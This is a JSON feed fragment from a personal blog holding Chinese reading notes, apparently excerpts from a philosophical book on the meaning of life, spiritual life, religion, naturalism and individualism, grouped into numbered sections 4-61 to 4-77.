            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>有些信仰，它不但要求我们相信虚无东西，而且还要求我们在经验的范围内，承认与亲眼所见完全相反的东西。</p>\n<h3 id=\"4-61\"><a class=\"markdownIt-Anchor\" href=\"#4-61\">#</a> 4-61</h3>\n<p>宗教思想使人们相信，是它赋予的生活的价值和尊严，这种建立在某种假设之上的思想告诉人们，人的精神力量是由信仰来创造的，人们必须把一切兴趣都集中到它的上面，当人们对这种思想产生怀疑时，更是如此。</p>\n<p>人们虽然脱离不了由神制定的规则和秩序，却仍要生活中构建一个独立的活动中心，作为生活的依赖。同时，还需要不断地完成整体所需，哪怕是最微小的帮助。</p>\n<p>由于上帝的精神力量的介入，人们从精神上摆脱了窘迫悲惨的困境，进入另一种生活。从精神层面获得的欣喜和满足，让善最终战胜恶有了保障。而人们生活的各种细节就必须遵守和服从这种崇尚的目标。</p>\n<p>那时候世界无法提出一个人们可以为之奋斗的精神支柱，而宗教恰好填补了这种空白。它带来了激情和崇高，成为人类精神中必不可少的组成部分。所以它成为世人审判的标准。人们在这个世界上可以通过证明自己的能力，找到能够生存下去的理由。</p>\n<p>各种工作让他手足无措、种种问题也随之而来，关于灵魂救赎的问题被排挤掉生活的角落里，不再受人关注。</p>\n<p>虽然宗教的形式仍然存在，但它已经失去了往日的辉煌与自信，蜕化为单纯的情感波动，这种情感波动不能也不可能给人们的生活带来真正的满足。</p>\n<p>我们的世界充满了无尽的活力，却要依赖一个连它自身生存都难以解决的陌生世界，这是一件很荒谬的事情。</p>\n<h3 id=\"4-62\"><a class=\"markdownIt-Anchor\" href=\"#4-62\">#</a> 4-62</h3>\n<p>宗教对人产生的激励作用，对愿景的建立，对人们追求完美和实现理想的鼓舞作用，有着无法抹煞的功绩。人们追求真理和幸福所付出的努力仍被他的标准所检验。</p>\n<p>人们让精力全部倾注到这些事情上，完全被他所吸引，将生活的种种琐事置于一旁，专注于这个王国亲密接触。这样他的生活便不再需要除自身以外的其他目标，它在发展中找到了自身的价值，满足于成功之后带来的喜悦。</p>\n<p>在那样的时期里艺术创造了激情和喜悦，虚无世界又无可争辩地成了生活的中心，占据了人们的全部精力和激情，这是不可否认的事实。这种精神的创造同时也造就了人类不断超越自我的道德行为。但那个时代过去了。</p>\n<p>人们可能始终在用一种很严厉的标准检验着品质的高低，可当这种挑战混乱人的内心时，人就会感到困惑和虚弱，低下的本性阻止着他们前进，此时他的信仰开始崩塌，不再认为可以实现自己的目标。尽管他也在进步，但内心深处的向往与渴望却无法满足。</p>\n<p>他过分强调了宇宙盲目的必然性和人类生存的非理性，以及人类总体上对崇高理想目标的冷漠。其次，他灌输了人类能力有限，这些局限阻碍了我们直接参与世界的活动。</p>\n<p>它本身不在尝试新东西，只是占据和拥有那些原来的东西。没有了创造性，那么它就不得不退化，只剩下教化作用了。虽然教化的功能也可以是人类生活的重要组成部分而发挥作用，但他只能作为生活的一部分，而无法满足整体生活需求。</p>\n<p>人们被要求全身心的投入到一个精神世界里，并为它献身；人们被告诫要像别人一样无私的服从于这一命令。但从另一方面来说，同自然和社会的自我保护这些大目标相比，与人们日常的各种兴趣和热情相比，教化对精神的价值是较小的。</p>\n<p>努力创造的新生活只会把我们引入歧途，它展现给我们的生活前景注定是一场虚幻。那些让我们怀抱的高远目标，往往适得其反，因失败带来的沮丧和质疑也更为强烈。生活赋予我们的愿景和希望，竟然是不管付出多大努力都无法实现的，这可能吗？</p>\n<h3 id=\"4-63\"><a class=\"markdownIt-Anchor\" href=\"#4-63\">#</a> 4-63</h3>\n<p>但是，如果某一观念已经没落，而它还在严重的影响我们的生活的话，我们该怎么去应付这些主张和因这些造成的混乱呢？</p>\n<p>它们像个苍白的幽灵纠缠在生活周围，仍强大得可以摧毁我们在现实世界的幸福，却又不能给我们打开另一扇门，不能为我们提供合适的奋斗目标和生活存在的价值与意义。</p>\n<p>我们的自身爱好必须在宇宙的规律面前谦卑的低头，必须付出更大的牺牲，因为虽然现实世界向我们展现了他的多样性，但人的内心却再萎缩，种种限制也会把它包裹得更紧。</p>\n<p>尽管我们总是失望于旧观念中无法保证的诺言，难道就不能从中得到一些可以让我们快乐的理由吗？无论怎样、人类已经在全身心地寻找这个问题的答案了。</p>\n<p>新生活的核心就是工作，就是对一个对象按照人们的意愿去改造和重塑。这种行为从严格的意义来说是行不通的，在严格的现代理念里，除非我们精确地掌握重塑对象的法律和法则，并将其全部吸收和预悟，否则这个过程就无法顺利实现。</p>\n<p>工作似乎确实可以提供这种意义：它的组织结构可以使人们工作效率大大提高，最大程度提升了个体的贡献，促进了世界范围内的团结。每个时代，工作作为一项共同去完成的任务，可以有效地把每个个体组织起来。</p>\n<p>在刚开始的时候，人们全身心的投入工作，虽然他的生活并不充实，但因为陶醉在取得成绩的幸福中，并不会对眼下的工作产生怀疑。然而随着工作的地位日趋重要，对劳动者越来越多的剥削，人们就不得不对它产生质疑了。</p>\n<p>物质的成果和精神的讽求之间的矛盾越来越尖锐化。精神从来不会满足这样的成果，它必须回到内心的生活，内心的精神生活才是他最终的目的。与此相比，其他的东西都不那么重要。</p>\n<p>精神需要时间去安抚，而工作却挤掉了大量的时间，让生活忙忙碌碌，牺牲掉了休息，甚至连喘气的机会都没有。因此精神势必要把工作看成它的敌人，并拿起武器奋勇捍卫权利。</p>\n<h3 id=\"4-64\"><a class=\"markdownIt-Anchor\" href=\"#4-64\">#</a> 4-64</h3>\n<p>现实世界对于精神来说，依旧是遥远和陌生的，尽管它是那样充满生机。</p>\n<p>我们如今面对的，不是变化多端的时尚思潮。而是历史潮流不可抗拒的压力，它不属于任何时代或任何客体，也无关任何观点或任何倾向，过去的唯心论的解决方案已失去了确定性和直接性。</p>\n<p>通过它我们有可能会找到一种生活的意义与价值，不必通过诉诸于另一个世界来完成，也没必要假设一个虚幻的王国，我们所追求的善也不需要去其他世界寻求。</p>\n<p>它呼吁我们把这种幻想从根基和生活的一切领域驱除掉，并按新思维模式去重建新生活。我们清楚地知道，这样的体系对于那些为生活所迫的人来说，具有怎样的召唤力和吸引力。这种尚在模糊中的体系成为一种信仰，符合人类的本性。</p>\n<p>人们被置身于一种毫无关联的孤立状态，完全是按照自然规律的要求机械的生活。人与自然只有加法和弄列的联系，丝毫没有半点内在的联系。个体之间的为生存而进行的竞争，只是生物进化的程序，而生活本身就是由这种竞争构建的一个整体系统 。</p>\n<p>系统里的个体谁也无法走出他的位置，因此人们的生活只有依赖，缺乏独立创新。体系没有给独创、独立和自由预留位置，对于任何发生的事，我们只能说，他发生了。</p>\n<p>如果生活缺少内在的一致性，仅靠外部刺激作出反应，一切仅靠外在的关系而适应不断改变的环境，缺少自由的能动性，那么，不仅对宗教来说是噩耗，对所有的道德和正义都是毁灭性的打击。</p>\n<p>艺术和科学所创造的一系列的感情和观念，都将变得冷漠、像人格、品质、气质这样的观念 都成了纯粹的空洞名词，就像宗教只是幻想和迷信的产物一样。</p>\n<h3 id=\"4-65\"><a class=\"markdownIt-Anchor\" href=\"#4-65\">#</a> 4-65</h3>\n<p>在这种体系里，人虽然具有自然的天赋，但如果不迫使他努力，改变其生存条件，纠正谬误和幻想的话，他就只是一个人生的观察者，只是一个真实存在的影子。</p>\n<p>一旦人类取得了胜利，完成启蒙，他就又被放回到自然中应有的位置，很难看出他还有什么事情可以做。他内在的发展陷于停顿，所有的成就都归于自然，而与人的意志无关。就是我们最终努力的方向是消灭所有的精神生活。</p>\n<p>如果有人以整理作为他的兴趣和欲望，那么他就不再是自然的碎片了。因为在追求真理和幸福进行的斗争中，他的生活就已经被卷入尖锐对立的漩涡，这是自然 — 借助于它缓慢而累积的行程 — 所不能理解和容许的。</p>\n<p>除非我们的条件很低，或者我们的思想不纯洁，再就是我们通过窃取对手的论点，慢慢改变自己的立场，所有按照正常逻辑思考的人所得到的结论都是一样的，即自然主义不会给我们带来任何结果，他得到的只是失望和否定。</p>\n<p>由于自然主义对幻想和迷信的极为强烈反对，才掩盖了他的自欺行为，他看不到自身体系的空洞和缺乏创造力。</p>\n<p>人的思维在很大程度上人仍被感官世界所统治，而只要这种观念还存在，我们就无法摆脱自然秩序的束缚。</p>\n<p>为个体或种族的延续服务，而无法让我们摆脱自然的机械秩序的性质，不能使我们选择和开辟自己人生的新道路。</p>\n<p>最初人的智力只是用于保存自身和激烈斗争的武器，后来便不限于如此，它可能让人摆脱感官世界而独立存在，与感官世界并列对峙，并独立感官世界之外冷静地审视他。</p>\n<p>人的思想不再受自然的限制，它可以站在自然之外独立思考，把自然作为一个问题来研究：人们体验着自然，并借此超越于自然之上。</p>\n<p>如果思想不能摆脱感官而是一直被它影响的话，就没有一切真正的文化，我们又如何知道它的存在呢？</p>\n<h3 id=\"4-66\"><a class=\"markdownIt-Anchor\" href=\"#4-66\">#</a> 4-66</h3>\n<p>思想是一个快步行走的先锋。它动摇了以前生活的旧习，他所坚持的理念和原则，力图要把它的内心需求表达出来。它激发了现代运动的力量和激情，即为实现真理而斗争。甚至物质水平的提高和繁荣也是受它的各种思想原则的激励。他维持和控制着我们的全部感官世界。</p>\n<p>自然主义的信条告诉我们，我们全部的运动都有盲目的服从于这个物质世界：甚至科学都不能对它进行解释，而只能对它进行描述。</p>\n<p>人在纯粹自然里扮演的只是自然指定给他的角色。因此，作为一个有思维存在的个体，无法容忍把他自己当成一种简单的动物对待。他不能不比较、不能不反思、不能不质疑。而且，如果他的问题找不到解释，他就会感到羞耻。而思想既能寻找问题答案，又能缓和矛盾冲突。</p>\n<p>思想之所以活动，是因为它有透彻和明了的需求，不管他忙于从破碎的言论中得出逻辑结论，还是忙于抵御各种矛盾，他都同时在关注自身的状态。那种完全依赖外部的生活，对它来说是肤浅的和不能容忍的。</p>\n<p>思想一旦要求做是在的全部，一旦声称统治生活和拥有生活支配权时，它的局限性便暴露无遗 — 生活便成为形式的和虚幻的：思想虽然有能量构建复杂的形式，却无法赋予它们任何有生气的内涵。</p>\n<p>思想扮演的不过是媒介的角色，将它的能动性释放、诱导它清晰地表现出来 /</p>\n<p>它本是起源于人的内心，现在就要反过来与人作对：他从自身的本性出发，制定出一些规范和路线让人们去遵守，强迫人们去努力工作和付出牺牲，它只管强调权力却对人们的感受和祸福冷漠无情。</p>\n<p>思想的浪潮汹涌地朝他们涌来，推动着人们向前迈进，却把人们的舒适和安全当成无关紧要的附属品。思想源于人的内心，受控于直接经验，是人类的某些从属，现在却要反对他，把他当成一种纯粹的工具使用。</p>\n<p>庞大的思想潮流席卷和支配着他们，像影子一样来来回回飘忽不定；他们全心的工作，只为了根本就实现不了的目标，事实上只是一种想象出来的而不是目所能及的目标，他们不过是宇宙过程中的工具。</p>\n<h3 id=\"4-67\"><a class=\"markdownIt-Anchor\" href=\"#4-67\">#</a> 4-67</h3>\n<p>它利用他们有抛弃他们，它把自己的本质隐藏在神秘的黑暗中，好像是为了一个不可思议的目标发狂，由它引发的混乱让我们痛苦不堪。一句话，就像自然一贯表现的那样，思想丝毫不顾及我们的感受，那么，它怎么能够解决人生意义的课题呢？</p>\n<p>思想认为感官是初始的和卑劣的，感官则认为思想是微不足道和无效的。但是，我们并不能因此退缩，我们要追求幸福，不能停止这种寻找。事实上，它可能包含的心胸狭窄和卑劣的特征；但是在他的背后有着更有价值的东西。</p>\n<p>如果人类听命于直接经验，就意味着人类将被一种存在的宇宙的过程所摆布，那么这种听命就无法让生活丰富和有意义，也无法确保自我价值的实现。我们只能拜倒在它的神秘而黑暗的必然性的祭坛上，但在当下的问题面前，他仍是个失败者。</p>\n<p>人对另一个世界的信心一旦被动摇，自然与思想便乘虚而入，把它作为一种工具使用，进而摧毁他的精神存在的基础，此时要想保存人生的意义与价值，唯一的途径就是：必须依赖生活的自给自足，并全心投入和促进这种生活。</p>\n<p>我们把所有的力量都集中在自己的本性上，这种生活，虽然让我们失去了很多东西，但是他除了缺陷以外，至少还有一个优点，就是它有一个明确的目标，向着这个目标去奋斗，我们就能找到自己的幸福，这便是现代主流思想所持有的观点，它的影响力渗透到了生活的各个方面。</p>\n<p>第一种生活，个体的主要职责就是改造外部环境和条件，调整社会交往和工作安排，以一切可能的方式推进整体的福利，然后个体就会得到幸福与舒适。就个体而言，无论是在他最内在的经验里，还是在梦想和渴望中，他都需要依赖整体，也就是他的环境的产物。</p>\n<p>第二种生活，它主要在意的是个体生活不受干扰，增强自身的力量，摆脱一切对自身束缚，并能够帮助他，自由的独立发展这种诉求的趋势是强调可塑性和通人性二把恪守成规看成一种基本把一致性看成形式主义无论我们完全服从哪一种，我们的生活，都陷入让我们无法忍受的而失去生活的一切意义。</p>\n<h3 id=\"4-68\"><a class=\"markdownIt-Anchor\" href=\"#4-68\">#</a> 4-68</h3>\n<p>我们通过全身心的工作，使合理的成为实在的，使实在的成为合理的。但是，为什么我，激励自己追求某种目标，并把自己的精神完全奉献给这种目标 – 如有需要，还要甘愿牺牲自己 – 而得到的结果和自己的利益没有直接联系呢？的确，即使作为一个共同体成员，我们果真能够在这种共同的利益中得到满足吗？富足、无忧无虑的生活、并不能使我们幸福。</p>\n<p>事实上，如果一种文明以推动和促进人的直接利益为目标，它就势必会打上贫瘠和荒凉的烙印。这种文明不会使人的本性得到激励和提高；它甚至不会去努力争取效果。它只接受认可它的人。它只能利用和使用现有的能力，即使是在他最成功的时候，也只是附人类身上的衣服。</p>\n<p>纯粹人本主义给人的生活带来如此多的问题和对立，要求人们付出巨大的劳动和牺牲，它不能使生活变得容易反倒使生活变得更加艰难。在一种相对简单的环境里实现无忧无虑的舒适状态，难道不比在高度文明的条件下更容易吗？如果人生的目标只是世俗的物质满足，文明就是一种致命的错误。</p>\n<p>精神的创造，无论他在何时何地以何种方式展现，只有在它的目的被全部接受和追求时，它才能成功；而在那些以社会为目的忙碌的文化中，它不过是作为一种为人类造福的工具存在，没有人会对它关心，使它沦为功利服务的奴隶。</p>\n<p>普遍意见更成了好恶的仲裁者，精神创造根本不能自发性的生存。</p>\n<p>即使拥有最自由制度的社会主义的文化，也不免要压制个性，把所有人的个性都降低到同一条水平线上。那些真正追求精神的艺术家，总是要求自己的作品具有一种永恒价值，追求一切独立于偶然性和变化之外价值。</p>\n<p>当它自诩自己就是全部真理时，尽管它有令人炫目的伪装，仍掩盖不住它的匮乏而空虚的生活。</p>\n<p>他们只能在自己的生存方式中生活，用主观的镜子反省内心的行为，虽然他们能够不断地得到暂时的满足，但也只是共生和继承在他们的孤立意识状态中。除非放弃个人主义，否则永远不能融合成一个整体。</p>\n<h3 id=\"4-69\"><a class=\"markdownIt-Anchor\" href=\"#4-69\">#</a> 4-69</h3>\n<p>也许他能从全貌的变化和转换中得到一时之快，但最终会令他处于厌倦和餍足状态。人不能永远生活在主观世界里，因为他的生活范围并不完全局限于此，而是会远远超出这个范围，他必须思考超出他范围内的东西。</p>\n<p>它让生活停止在纯粹的个性上，自身的能力和情感被压制在偶然和有限存在的狭窄道路上，让我们每个人都承受他的特性的约束，而他并没有能力去挣脱这种局限。个人主义的生活以及它的多样性和智谋，有着难以形容的狭隘和贫乏。</p>\n<p>社会主义文化所指导的生活是关注外部条件，只顾重视外部而忽视了生活自身。个人主义文化偏重于生活自身，但因为他无法超越孤立状态和片刻时间，使我们不能拥有生活的整体，找不到他的内在性和内心世界。</p>\n<p>富足的无畏吝啬、粉饰的自私，毫无意义的自我专注、不惜一切贪吝，无端的攻击、令人厌恶的虚伪、缺乏勇气的大话、对精神任务的冷漠、对个人利益的过分勤劳等。所有这一切都太过明显了，令人无法忽视。</p>\n<p>如果说宗教信仰让人得到的是一个看不见摸不着的世界的话，他至少还可以要求把这种信仰建立在一种积极的可能性上。因为它从不把感官经验和现实画等号。</p>\n<p>有些信仰，它不但要求我们相信虚无东西，而且还要求我们在经验的范围内，承认与亲眼所见完全相反的东西。</p>\n<p>切断与扩大的现实世界的联系，将自己封闭在一个小范围内，人的生存只能忍受在狭隘和卑下的小空间里，连他生命的本性也就此隐藏起来。</p>\n<p>因为人的本性被紧紧束缚和围困，不可能仅靠一句话的魔法就能使他的生活和命运得以更新。所以，他必须做出选择，要么与现实文化决裂，要么放弃追求内在本性的提升，放弃追求生命意义与价值这一希望。</p>\n<p>当我们努力地想把精神生活建立在我们认为非常了解的东西上时，它却越来越远地离开了我们的生活。我们曾寄希望于建立一个统一的整体，那些相互对立、相互斗争的运动却让我们得到了与希望相反的结果，而且那些我们希望获益的地方却让我们损失更大。</p>\n<h3 id=\"4-70\"><a class=\"markdownIt-Anchor\" href=\"#4-70\">#</a> 4-70</h3>\n<p>自然主义以冷漠的态度对待人们，将其视为无意识的机械的一部分，理智主义则认为人不过是思想进化过程中的容器、工具和机械。</p>\n<p>这些体系想现它的独特性，便会竭力和粗暴地排除一切补充给它带来的影响，这样就会越来越狭隘、不足和不可靠。就像精神特征中所常见的那样，表面的胜利越迅速将预示着内在的毁灭也越快。</p>\n<p>时而让人回到自身那个冰冷的世界里，时而又让人摆脱狭隘和愚昧的人际关系，置地到辽阔无边的宇宙中生活。找不到一处可以来的稳定的根基，没有一种合理的综合，没有一种生活可以补偿所遭受的困苦和烦恼。</p>\n<p>我们追求确定性，却陷入了可怕的一团糟；我们寻找整体的人生，却得到了破碎地、对立的生活；我们渴望和谐和愉悦的生活，却看到生活中到处都是冲突、烦恼和忧愁。</p>\n<p>那些早已无处容身的旧教条，混进了我们的新学说，对新学说的发展造成了毁灭性的后果，让我们的精神面临不诚实的威胁。有多少不切实际的言辞、虚假夸大的激情、博的人心的自欺与所谓的宗教复兴结合在了一起？</p>\n<p>在那样的环境里人们对人生的意义问题不会感兴趣，没有答案也不会失望。但是我们目前所处的绝对不是一个衰弱无力的时代，它的活力四射，驱赶着人们在进行着最紧张的工作。</p>\n<p>有些人因为内在生活的缺乏而积极投身到工作中和持续不断的运动里，试图用这种手段慰藉自己的心灵。但是，这种解决办法只能是暂时的，因为人的终极目的是完整的实现自我和感觉自我，并为这种完整性填实一种内容，而这项内容是单纯的工作无法提供的。</p>\n<p>很多人专心致志沿着和一切希望与感情又密切关系的道路，去努力探寻人类各种本性的满足。但在这条路上他们无法获得进步，哪怕是他们认为的进步，却消耗了他们过多的精力。</p>\n<h3 id=\"4-71\"><a class=\"markdownIt-Anchor\" href=\"#4-71\">#</a> 4-71</h3>\n<p>没有共同的精神价值标准，一个人所认为的黄金，在另一个人看来则是铜币。</p>\n<p>每当讨论人生的重大问题时，因它固守肤浅的理论和对问题不负责任的否定，损害了人的自由创造力并由此造成了道德力量的损害。进而造成人的精神的混乱，在处理人生这种重大问题时变得草率，导致得到的结果与现状真正需求恰好相反。</p>\n<p>他的精神色盲，他只能看到他自己活动范围内的东西，其他的经验和印象–无论如何深刻–他都一概看不到。</p>\n<p>生活在这种环境中的人，没有精神直觉，像理性与自由、进步与发展、内在论与一元论之类的东西，他也能够充满热情地去对待，并能从这些纯粹的抽象中收获满足，但他不会用心去阐释这些理论或证明它们的合理性。</p>\n<p>现在的生活已陷入极大的矛盾和痛苦中，这种生活曾试图从直接那里得到最终的答案，但结果它的愿望落空了。现在，这种结果已经让我们意识到，我们必须做出选择：要么放弃理性，要么改变生活。</p>\n<p>人类的本性身处便有这么一种渴望，这种渴望迫使我们由内心开始来探求生活的真谛，并使生活完全成为我们自己的生活。</p>\n<p>可见的世界拥有诸多的可能性，却不能满足人性中某种迫切的需求，即使倾其所能，也不能给生活以意义。</p>\n<p>人类必须尝试使用不同的方式，或多或少的同化世界，使其成为人类生活的一部分；也必须在其存在里找到一种精神解脱，摆脱狭隘的生活空间的限制。</p>\n<p>面对自然的壮阔与冷漠，我们人类在这苍茫无限中显得极为微小和孤苦，社会生存环境又深陷群情激愤而精神匮乏的漩涡，人类由于自私，被表象局限以及放任不能自控的本能，从而导致他的道德低下；这一切世人皆见，无须回避。</p>\n<p>绝对不可能有一个大家所拥有的共同世界，决不能依赖于个人的经验，决不能有大家所共识的真理，在任何地方都能通用。</p>\n<h3 id=\"4-72\"><a class=\"markdownIt-Anchor\" href=\"#4-72\">#</a> 4-72</h3>\n<p>正是我们在人生中发现和感悟到的东西，将决定我们最终的答案。</p>\n<p>在很多时候，我们对那些在生活中看不到的世界基本上一无所知。</p>\n<p>在这一切的过程中，人们会有很多想象不到的新发现，新感悟，这些新发现不仅使人类感到足够的优越感，而且更能从中获得无比充实的人生体验，如同一次美妙无比的旅行。</p>\n<p>它所提出的真理，似乎根本不会受到人类的现实遭遇和变化的影响，更不受个体之间的差异和冲突的影响。它以一种极高的姿态声自称远远高于人的一切奇思妙想，并且能够控制和支配它们。</p>\n<p>人的精神生活其实是一种几乎虚无的东西，而我们对它的一切关注最终也会成为一种幻想，除非在其背后有一个足够强大的精神世界作为后盾支撑着，在那里能获得权力，以及使人信仰的证明。</p>\n<p>人类当然不仅仅只是演戏的舞台。我们人类的诸多行为，对于实在界的活动有着极为重要的作用，甚至有时候人类的活动可以左右一切。</p>\n<p>一旦人的生活欲奋力摆脱其本性的时候，它便会被极大的不安所占据。</p>\n<p>一切精神的努力，无论其当事者是否知晓、是否期望，都需要颠倒现存的状况，把支点转移到这同一个精神立场。</p>\n<p>如果没有自由，那我们的生活便变得一团糟，而生活也就不完全属于我们自己了，而是被自然或是命运支配着，它虽然在我们内部发生，但是却根本不是由我们决定的。</p>\n<p>如果那些我们不怎么待见的东西竟然会吸引我们的全部精力，甚至变成了我们个人的责任问题，那么我们的生活便必然在令人气馁的矛盾中苦苦挣扎。</p>\n<p>人之所以要劳动是因为他为了追求某种更高的精神生活，然而，不管这一点如何确实，它所才去的精确形式却只能由他自己的努力所决定。</p>\n<p>怀疑总是会不时地对那些基础发动袭击，甚至会降其主要意义搅得一团糟。</p>\n<p>有太多束缚或者不尽准确，那么，我们就可以想尽各种办法去挣破束缚，从而努力达到我们想要的生活，我们的人生也会得到更大的释放。</p>\n<h3 id=\"4-73\"><a class=\"markdownIt-Anchor\" href=\"#4-73\">#</a> 4-73</h3>\n<p>无论精神世界有多么大的提高，也不把它作为其他生命界的附属品，它自己必须是有生命的，是独立的，完全属于自己。</p>\n<p>从此只能屈服于结果的计划，反对强烈的精神紧张。它称为功利最顺从的奴仆，完全适应了功利的要求，如此一来，便会将一切内在性毁灭了。</p>\n<p>如果高等行为与低等行为成了一种混合体，如果人格与个性等要素没有什么奇特的性质，而只是扩大的自然行动，那么，这种运动就根本没有刷新的能力。</p>\n<p>即使是人性所能达到的纯粹精神，也是不可能永远存在的，倘若一经停滞，就必然会堕落，会陷入自然利益的领域而遭蒙混合不成形的痛苦。</p>\n<p>我们曾做过无数的白费精力的努力，这些努力虽然看起来是极其纷繁的，然而彼此必经有密切的关系。而对于努力付出的人，实际上也是有很确实的益处。</p>\n<p>精神生活宣称他所提供的内容是永远真实而显赫的，而至于人的事业，是时而发达，时而低落。无论是人的生活，还是生活所要求的，它们都是变化无常的。</p>\n<p>过去一切旧的东西，在新的光明之下都将被重新解释。</p>\n<p>我们在最初工作的时候，只是简单地为了满足我们重在的需要，如果我们要求为所付出的劳动而获得报酬时，任何人也不能责备我们。</p>\n<p>工作本身会使我们自身变得更加可贵，因为它建立了一种能够地址工作者突发异想的精神联系，它使我们能够承认更大的困难甚至牺牲，它变成了我们不断取得进步的莫大力量。</p>\n<p>共同的生活经验造成了一种共同的善恶标准，一种共同的目标，一个共同的利益范围，使个人的地位渐渐变得坚固，同时又能将个人的自私限制起来。</p>\n<h3 id=\"4-74\"><a class=\"markdownIt-Anchor\" href=\"#4-74\">#</a> 4-74</h3>\n<p>那些以往时代称之为不朽的东西不管我们如何固执的等待，并试图把它们所划的界限尊为普通规律，试图在不同的时期找出一条同样的界限，并区分哪些是该时代的产物，哪些是不受时间影响，是世界历史上所有时代共通的内容。如此这般历史便以一个精神世界的状态呈现出来。</p>\n<p>人们通过努力获得的不过是当下的快乐与成就。不过，如果仅仅满足于此，不再从精神生活上努力，使精神生活更加丰富的话，那之前的努力也就没什么意义了。</p>\n<p>这场革命所带来的成效，是让我们有可能用永恒价值对抗即时的现在，这些永恒价值包括所有时代和人类一切恒久的东西。这样便有了一个用时间评价一切的可行性标准，凡是与这个标准相抵触或相违背的都被判定为不能产生持久性影响的立场。</p>\n<p>一种更深层的实在在支撑和激励着自然，如果没有它的存在，自然获得她所达到的一切是不可能的。</p>\n<p>精神生活的存在总是以一种不能真正适合它的方式体现，所以它永远无法摆脱矛盾，它只能在这种充满对立的环境里展现自己，这种环境成了我们的束缚，令我们无法逃离。</p>\n<p>在人类的经验里最初认识到精神的无限性和它的深不可测，但我们被束缚在尘世的生活里，它无法自由地得到全面展示。</p>\n<p>自然我行我素，不顾一切精神的抱负，命运却从不区分善恶：我们无比期待着的，却根本没法看到任何公正的秩序和爱的王国。</p>\n<p>即使是在完全属于人的范围里，精神生活也没有一点儿稳定的地位和可靠的主权，而是被人滥用了，被人作为私人利益或党派利益的工具。</p>\n<p>秘密不仅没有被解开，却反而被掩藏在更深的地方。</p>\n<p>如果我们仅仅只是按照世界对我们的呈现来看待我们自己，并且只是按照世界所能承认的程度评价我们的生活，如此一来，那怀疑一定会获得胜利：如果按原貌判断事物，那肯定会从内在上将我们一切生机勃勃的冲动全部摧毁。</p>\n<h3 id=\"4-75\"><a class=\"markdownIt-Anchor\" href=\"#4-75\">#</a> 4-75</h3>\n<p>其实我们所亲眼目睹甚至亲身经历的自我实现的劳动便是实在本身，而且，也正是由于在这一自我发现的劳动过程中，实在确立了它自己的信仰基础。</p>\n<p>如果我们的生活不是那么空洞与虚弱，怀疑便根本不会使我们变得消沉。从现在看来，只有一件事能使我们摆脱它们的压力，那就是内心生活的更新和重建。</p>\n<p>我们所构想和辩护的精神生活，不只是我们存在的一部分，也是当我们感到厌倦和辛劳时，可以全身而退的避难之所。</p>\n<p>倘若我们整个尘世的存在只是一个片段，那么我们就不要指望它会澄清一切疑团，这不仅是不明智的，而且还会有许多毫无意义的可能性。</p>\n<p>一开始被我们看做障碍的东西，到后来却有可能被证明是一种有益的助力。我们很多时候对生活的否认，常常仅仅是因为我们用一种错误的评价标准去评价。</p>\n<p>如果一种内在的稳定和进步，一种性格的深化才是真正重要的事，那么我们对生活所带来的结果所做的判断确实可能不同于现在，我们甚至可能会开始重视曾经看来似乎毫无意义的冲突或可耻的穷困。</p>\n<p>表面上合情合理的东西是多么容易转向它的相反面，因此，对于在这方面所取得的成功，我们仍然会感到非常不安。</p>\n<p>毫无疑问，我们一生中所从事的工作不会是毫无价值的，其最有意义的不会只是我们从事的各种活动本身，而是由此而获得的精神生活的满足，这才是最宝贵的。</p>\n<p>只有当人类生活去努力探究它自己的力量时，才有可能寻找到答案，真正有意义的启示是只能从生活本身的教导和经验中得来，而不可能从外部得来的。</p>\n<p>我们的生活住线路必定不是美好的享受，而是要一直不停的运动，甚至是折腾。事实上，从长久的历史经验来看，我们人类的一切精神生活必定总是蕴含着某种斗争的因素。</p>\n<h3 id=\"4-76\"><a class=\"markdownIt-Anchor\" href=\"#4-76\">#</a> 4-76</h3>\n<p>正是当他把精神生活看做他自己生活的全部时，他才会意识到一个内在的精神世界，它即是无限的、又是他真正的自我。</p>\n<p>在它们背后支持其发展的，是大全的基本的生活，一旦离开了这一生活，它们便会马上表现出这样的趋势，丧失掉它们的精神生活，沦为世俗精神的牺牲品。</p>\n<p>如果仅仅只是迷恋于感官世界的需要，那么人类生活就根本不值一提。如果我们人类的幸福是指满足的话，它不会是因为我们的全部工作而离我们更近一点，相反，它会比以前更远。</p>\n<p>无论其外部过程可能多么平静，它仍涉及一个重大决策。这个选择当然不是在瞬间就可以完成的，而是要用整个的一生努力去完成。</p>\n<p>我们的生活绝对不是空洞表面的游戏，而是在它当中有极其重要的事情正在发生，这运动与我们休戚相关，我们完全能够预测出它的方向。</p>\n<p>不存在任何完美的成就，一切都在创造之中。我们看不到终点，而只看到走向终点的道路。光辉的顶点尚未到达，细致入微的改进还在继续。</p>\n<p>我们看到了一片纷乱错杂，看到了我们无休止的奔波追逐，甚至不顾尊严虚伪的抬高自己，自负而强烈地推行着自己的主张，对其他人的要求大加干涉甚至反对；我们已经迷失了，本来无比简单的生活却被异己而非自己的兴趣所占据，这可真是毫无意义。</p>\n<p>人们带着他自己的喜恶，伪装成善与恶，真与假的最高仲裁者，因此，努力的主要目标是赢得社会的赞赏与尊重，说白了，其实是活在别人的世界里，这可真是可悲。</p>\n<p>也许在纯粹人本主义文化之外，还有某种更高的文化形式，也或者，生活对我们来说，没有任何意义和价值。</p>\n<h3 id=\"4-77\"><a class=\"markdownIt-Anchor\" href=\"#4-77\">#</a> 4-77</h3>\n<p>我们坚决反对轻率地把人格用作口号和医治一切时代邪恶的所谓的灵丹妙药的不正常倾向，因为众所周知，首先人格需要赋予其一个充实的内容（至少在表面上），以及一个更加广泛的背景，否则，一切都是空谈。</p>\n<p>通过那么多努力的收集、编纂、研究和重构，我们整个文化变得乱糟糟的。它把伟大、渺小，生机勃勃与死气沉沉混到了一起。它没办法区分短暂与永恒，不能在那无垠的历史遗产中去发现简单的指导原则，所以它也就不可能把我们的努力引向一个较为确定的目标。</p>\n<p>我们现在所处的时代存在许多非常重大的问题。我们越是多地把他们连在一起，我们便越感到清楚，为了使他们得到更好的解决，我们必须像前面一直强调的那样，求助于一种独立的精神性，一种形成其自己的世界的精神生活。</p>\n<p>这个时代是一个充满争端的时代（事实上，又有哪个时代不是呢），它的重要意义很难否认，对于那些想从生活中赢得意义的人们来说，毫无疑问这也是一个充满无限机会的时代。</p>\n",
            "tags": [
                "成长",
                "意义",
                "人生哲学"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/57%E3%80%8A%E4%B8%8D%E6%9C%BD%E3%80%8B%E7%B1%B3%E5%85%B0%C2%B7%E6%98%86%E5%BE%B7%E6%8B%89/",
